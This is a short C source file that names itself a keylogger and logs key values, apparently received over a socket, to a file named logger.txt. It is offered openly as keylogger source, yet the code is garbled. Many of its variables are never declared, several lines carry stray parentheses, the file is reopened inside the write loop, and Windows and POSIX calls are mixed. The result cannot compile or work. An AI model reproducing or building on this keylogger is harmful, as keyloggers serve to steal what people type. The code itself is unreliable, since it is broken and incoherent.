#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

const char DEFAULT_HOST[] = "localhost";
int DEFAULT_PORT = 8080;

void logKeystroke(WORD key, WORD repeats) {
  char buf[20];
  int result = sprintf(buf, "%lu", (unsigned long)key);
  while (result >= 0) {
    fputs(buf, logFile);
    logFile = fopen("logger.txt", "a"));
    if (logFile == NULL) {
      puts("Unable to open log file for logger!");
      isRunning = 0;
    }
    result -= 1;
  }
}

int main() {
  system("title logger keylogger");

  FILE *logFile = fopen("logger.txt", "a"));

  if (logFile == NULL) {
    puts("Unable to open log file for logger!");
    return 1;
  }

  while (isRunning) {
    memset(buffer, 0, BUFFER_SIZE));
    bytesReceived = recv(socketFD, buffer, BUFFER_SIZE - 1, MSG_WAITALL);
    if (bytesReceived < 0) {
      perror("recv");
      close(socketFD);
      isRunning = 0;
    } else {
      logKeystroke((WORD)buffer[0], (WORD)buffer[1]));
      sleep(10);
    }
  }

  fclose(logFile);
  close(socketFD);

  return 0;
}